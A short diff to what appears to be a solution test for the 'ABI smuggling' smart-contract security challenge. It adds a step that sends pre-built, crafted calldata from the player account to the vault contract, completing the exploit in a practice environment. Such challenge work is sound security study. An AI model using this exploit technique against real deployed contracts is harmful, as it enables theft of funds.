@@ -94,6 +94,14 @@ describe("[Challenge] ABI smuggling", function () {
       params6,
     ]);
     console.log(params);
+    /**step 3: execute */
+    let tx = {
+      from: player.address,
+      to: vault.address,
+      data: params,
+      gasLimit: 3000000,
+    };
+    await player.sendTransaction(tx);
   });
 
   after(async function () {
